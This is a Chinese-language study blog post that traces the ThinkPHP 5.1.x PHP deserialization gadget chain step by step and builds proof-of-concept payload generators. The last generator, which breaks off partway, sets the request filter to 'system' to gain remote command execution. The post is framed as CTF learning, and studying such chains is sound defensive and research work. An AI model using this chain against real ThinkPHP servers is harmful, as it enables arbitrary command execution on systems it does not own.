    <content type="html"><![CDATA[<h1 id="ThinkPHP-5-1-x反序列化"><a href="#ThinkPHP-5-1-x反序列化" class="headerlink" title="ThinkPHP 5.1.x反序列化"></a>ThinkPHP 5.1.x反序列化</h1><p>我们已经学习了php反序列化的基础操作,但这远远不够</p><p> 前不久在比赛中遇到过几次thinkPHP反序列化的题目, 让人摸不着头脑, 最近又在大佬博客中无意间刷到了这部分内容, 在这里进行学习</p><p>参考: <a href="https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE">https://boogipop.com/2023/03/02/ThinkPHP5.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%85%A8%E5%A4%8D%E7%8E%B0/#%E4%B8%89%E3%80%81ThinkPHP5-1-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建:"></a>环境搭建:</h2><ol><li>php7.2.34nts(phpstudy)</li><li>thinkPHP5.1.34</li></ol><h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>首先就是tp5.1.34的安装, 几次从网上下载都不成功,最终方法是:</p><p>在phpstudy的composer2.5.8</p><p>在终端打开composer2.5.8的目录输入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/think=5.1.* tp5_1_37</span><br></pre></td></tr></table></figure><p>下载后进入tp的目录</p><p>把”topthink&#x2F;framework”: “5.1.*”改成”topthink&#x2F;framework”: “5.1.37”</p><p>之后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer update</span><br></pre></td></tr></table></figure><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h3><p><strong>首先跟一遍如何找链子</strong></p><p>由之前所学的知识可以找到, php反序列化最常见的入口就是<code>__destruct()</code>和<code>__wakeup()</code>其中最常见的就属<code>__destruct()</code></p><p>这里也正是利用<code>__destruct()</code>作为入口</p><p>首先seay全局查找<code>__destruct()</code></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304224653354.png" alt="image-20240304224653354"></p><p>我们要使用的就是<strong>think\process\pipes\Windows</strong> 类的 <strong>__destruct</strong> </p><p>其目录位置: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;process&#x2F;pipes&#x2F;Windows.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225102324.png" alt="image-20240304225102324"></p><p>跟进removeFiles()这个函数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225229060.png" alt="image-20240304225229060"></p><p>这里调用了一个**file_exists($filename)**函数, 有趣的是这里的文件名 <strong>$filename</strong> 变量是可控。如果我们将一个类赋值给 <strong>$filename</strong> 变量，那么在 <strong>file_exists($filename)</strong> 的时候，就会触发这个类的 <strong>__toString</strong> 方法。</p><p>全局搜索**__toString()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304225657758.png" alt="image-20240304225657758"></p><p>这里选用<strong>think&#x2F;concern&#x2F;Conversion</strong>类</p><p>目录路径: <strong>&#x2F;thinkphp&#x2F;library&#x2F;think&#x2F;model&#x2F;concern&#x2F;Conversion.php</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304230129898.png" alt="image-20240304230129898"></p><p>跟进**toJson()**方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231418906.png" alt="image-20240304231418906"></p><p>继续跟进<strong>toArray()</strong></p><p>在<strong>toArray</strong>中**$relation<strong>可控, 并且赋值后调用</strong>$relation<strong>下的</strong>visible()**</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231547711.png" alt="image-20240304231547711"></p><p>跟进<strong>getAttr()方法</strong>看看$relation到底从何而来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240304231259379.png" alt="image-20240304231259379"></p><p>跟进<strong>getData()</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305001517580.png" alt="image-20240305001517580"></p><p>$this-&gt;data[$name]可控</p><p>这里附一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/4.png"></p><p>依照大佬的思路, 这里没有可利用的visible方法, 需要一个**_call()<strong>来被这个</strong>$relation-&gt;visible($name);**触发</p><p>依旧是全局搜索, 在<strong>think&#x2F;request</strong>类中</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002602378.png" alt="image-20240305002602378"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305002656453.png" alt="image-20240305002656453"></p><p>这里 <strong>call_user_func_array</strong> 函数的第一个参数完全可控, 因此我们可以调用<strong>call_user_func_array(array(任意类,任意方法),$args)</strong>, </p><p>虽然第330行用 <strong>array_unshift</strong> 函数把本类对象 <strong>$this</strong> 放在数组变量 <strong>$args</strong> 的第一个，但是我们可以寻找不受这个参数影响的方法。</p><blockquote><p>分析过 <strong>ThinkPHP</strong> 历史 <strong>RCE</strong> 漏洞的人可能知道， <strong>think\Request</strong> 类的 <strong>input</strong> 方法经常是链中一个非常棒的 <strong>Gadget</strong> ，相当于 <strong>call_user_func($filter,$data)</strong> 。但是前面我们说过， <strong>$args</strong> 数组变量的第一个元素，是一个固定死的类对象，所以这里我们不能直接调用 <strong>input</strong> 方法，而应该寻找调用 <strong>input</strong> 的方法。</p></blockquote><p>先来看看<strong>input()<strong>方法, 这里直接可以执行一个</strong>call_user_func($filter,$data)</strong></p><p>对应参数 $default 和 $filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131417663.png" alt="image-20240305131417663"></p><p>回调$this-&gt;filterValue()方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305131601772.png" alt="image-20240305131601772"></p><p>我们需要控制的就是input的第一个参数$data和最后一个参数$filter</p><p>由于上面也提到了**__call()** 下的<strong>call_user_func_array(array(任意类,任意方法),$args)<strong>中</strong>$args</strong>是不可控的($args的第一个值被强制定义), 所以这里无法直接调用<strong>input()</strong>,因为我们不能控制其参数</p><p>所以应该转而查找哪里调用了<strong>input()</strong>,以此来间接调用避免掉**$args**的影响</p><p>这里不选用request</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305132947432.png" alt="image-20240305132947432"></p><p>找到当前类的param方法, 第961行调用了input, 且 第一个参数完全可控,  但$filter不可控, 因此, 又需要寻找哪里调用了param方法</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135640187.png" alt="image-20240305135640187"></p><p>可以看见, 当前类下的isAjax和isPjax两个方法都调用了param方法, 且参数完全可控</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240305135916160.png" alt="image-20240305135916160"></p><p>至此, 链子就有了</p><p>首先, 在windows.php下</p><p><strong>__destruct()</strong> –&gt; <strong>removeFiles()</strong>  –&gt;  <strong>__toString()</strong> –&gt;  </p><p>在Conversion.php下</p><p>–&gt; <strong>__toString()</strong>  –&gt; <strong>toJson()</strong>  –&gt;  <strong>toArray()</strong> –&gt; </p><p>在request.php下</p><p>–&gt; <strong>__call()</strong> –&gt;  <strong>isAjax()</strong>  –&gt; <strong>param()</strong>  –&gt; <strong>input()</strong>   –&gt; <strong>filterValue()</strong>  –&gt;  <strong>call_user_func()</strong></p><p>贴一张大佬的图</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/10.png"></p><h3 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h3><p>上面已经找出来了一条链子, 但是具体细节并没有关注</p><p>前面的**__destruct**的触发不必多说, 但是 **__toString()**的触发就出现了第一个坑</p><p>我们在Conversion类的定义处可以发现, Conversion类是被trait修饰的, 因此, 它并不能被实例化, 但是trait修饰的类可以被其他类use,达到类似继承的效果</p><p>查找一下use了Conversion的地方</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102313714.png" alt="image-20240306102313714"></p><p>这里有一个Model类, 跟进看一下</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102413394.png" alt="image-20240306102413394"></p><p>Model虽然use了Conversion, 但它又被abstract修饰, 因此也不可以实例化, 但我们可以再查找继承Model的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306102637593.png" alt="image-20240306102637593"></p><p>不难发现有一个Pivot类是继承了Model类的,</p><p>因此, Pivot通过继承use了Conversion类的Model类,间接存在一个toString方法</p><p>因此, 触发链的开头就是</p><p>Windows-&gt;__destruct()   ——————-&gt;&gt;&gt;&gt;     Pivot-&gt;toString()</p><p><strong>poc</strong>:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//上面的继承关系并不用关心, 与源码中相同即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [<span class="keyword">new</span> <span class="title class_">Pivot</span>()];<span class="comment">//触发Pivot(Conversion)-&gt;__toString()</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如此, 代码执行后就会跳转到Pivot 下的toString, 由于这个方法是继承的Conversion的, 自然会跳转到Conversion类中</p><p>需要注意的是这里Windows-&gt;files是一个数组, 这是由源码中定义的</p><p>跳转到toString后, 依次要进入的是toJson,  toArray, 中间的过程并没有传递我们可控的参数, 所以并不关心</p><p>toArray的代码段比较长, 都是遍历了几个this下的可控变量, 我们只关心以下这个遍历</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;    <span class="comment">//$this-&gt;append数组下的一个值需要为数组</span></span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);<span class="comment">//$this-&gt;append as $key =&gt; $name</span></span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>(<span class="variable">$name</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">            <span class="comment">// 追加关联对象属性</span></span><br><span class="line">            <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelation</span>(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">                <span class="variable">$relation</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">visible</span>([<span class="variable">$attr</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>, <span class="variable">$item</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$item</span>;</span><br></pre></td></tr></table></figure><p>准确来说, 只关心这其中的</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306105934360.png" alt="image-20240306105934360"></p><p>我们想要的是执行到$relation-&gt;visible($name);来调用一个_call, 所以需要几个条件</p><ol><li>进入 186行的if</li><li>在$relation &#x3D; $this-&gt;getRelation($key);操作后, $relation变成一个false或者null,以进入下一个if内</li><li>$relation &#x3D; $this-&gt;getAttr($key);后$relation变成我们指定的一个对象, 以调用该对象下不存在的visible方法来触发该对象的__call方法</li></ol><p>这里操作的是$this-&gt;append as $key &#x3D;&gt; $name, 记住这个, 然后跟进$relation &#x3D; $this-&gt;getRelation($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306110629197.png" alt="image-20240306110629197"></p><p>我们不给$this-&gt;relation赋值, 所以, 不论如何这都会返回一个空值</p><p>这里返回空值, 直接进入我们预期的if内</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111809929.png" alt="image-20240306111809929"></p><p>继续跟进下一个调用的$relation &#x3D; $this-&gt;getAttr($key);</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111135706.png" alt="image-20240306111135706"></p><p>代码后面$value是这个getAttr的返回值, 它由$value    &#x3D; $this-&gt;getData($name);决定, 继续跟进getData</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306111534803.png" alt="image-20240306111534803"></p><p>这里有很多种return的值, 但是不要忘了, getData的返回值return给getAttr,   getAttr直接将得到的值返回给</p><p>$relation, 我们需要$relation为一个对象实例</p><p>这里getData的参数$name来自于this-&gt;append数组的key, 所以就可以让</p><p>this-&gt;data &#x3D; [‘nacl’&#x3D;&gt;new Request]; &#x2F;&#x2F;Request存在_call方法</p><p>this-&gt;append &#x3D; [‘nacl’ &#x3D;&gt; [‘nacl’ &#x3D;&gt; ‘nacl’]];    &#x2F;&#x2F;这里必须有一个value是数组</p><p>只需要保证this-&gt;data和this-&gt;append拥有相同的键, 即可将该键所对应的值返回给$relation</p><p>注: 这里Povit的data属性是继承自Attribute类, 而append继承子Conversion类</p><p>更新poc为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files=[<span class="keyword">new</span> <span class="title class_">Pivot</span>()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Windows</span>()));</span><br></pre></td></tr></table></figure><p>跳转到Request类的__call</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306125911092.png" alt="image-20240306125911092"></p><p>依照一开始的链子, 此时需要借助call_user_func_array用this-&gt;hook来触发this-&gt;Ajax</p><p>也就是 $this-&gt;hook &#x3D; [“visible”&#x3D;&gt;[$this,”isAjax”]];</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306130953805.png" alt="image-20240306130953805"></p><p>成功跳转到isAjax, 此时我们不用关心传过来的参数, 因为330行的array_unshift将$this插入到了$args最前面,使得这个参数不可控</p><p>之后, 我们需要通过param的调用来调用到input</p><p>param接收一个参数为$this-&gt;config[‘var_ajax’]完全可控,跟进param</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306131812594.png" alt="image-20240306131812594"></p><p>在这个方法中会将GET数组赋值给<code>this-&gt;param</code>属性</p><p><strong>注:  经过调试发现, 在还没有执行反序列化之前, 此方法已经被调用过, 它将get请求的数据以键值对的方式赋值给$this-&gt;param</strong></p><p>这里调用了input传入的前两个重要参数$this-&gt;param和$name($name即为$this-&gt;config[‘var_ajax’])</p><p>跟进input</p><p>此时传入的$data就是get请求数据的键值对, $name由$this-&gt;config[‘var_ajax’]可控决定</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306134002703.png" alt="image-20240306134002703"></p><p>这里又出现了一次getData, 实际上, 这个getData就是将传入的形式参数$data数组中键为形式参数$name的值返回, 在这里即为返回get请求数据中键为$this-&gt;config[‘var_ajax’]的值</p><p>不妨设置:</p><p>$this-&gt;config &#x3D; [‘var_ajax’ &#x3D;&gt; ‘nacl’]; </p><p>这样, $data就变成了get请求中键位nacl的值</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135222503.png" alt="image-20240306135222503"></p><p>这里$data就已经变成我们设置的字符串了</p><p>之后跟进getFilter()方法来设置之前已知被赋值为默认值的$filter</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135657139.png" alt="image-20240306135657139"></p><p>这里将要返回的值$filter默认为空字符串, 之后会被赋值为$this-&gt;filter, 并且追加了一个默认值$default2为null并返回</p><p>之后跳到:</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306135953679.png" alt="image-20240306135953679"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240306140016138.png" alt="image-20240306140016138"></p><p>zhe</p><p>可以看见传入的实参$filter是要执行的任意函数, 传入的实参$data要执行的任意函数的参数</p><p>那么, $this-&gt;filter就是要执行的任意函数</p><p>$this-&gt;filter &#x3D; “system”;</p><p>最终poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">concern</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"><span class="class"><span class="keyword">trait</span> <span class="title">Conversion</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Request</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = [<span class="string">&#x27;nacl&#x27;</span>=&gt;<span class="keyword">new</span> <span class="title class_">Request</span>()];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;append = [<span class="string">&#x27;nacl&#x27;</span> =&gt; [<span class="string">&#x27;nacl&#x27;</span> =&gt; <span class="string">&#x27;nacl&#x27;</span>]];</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$config</span> = [];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span 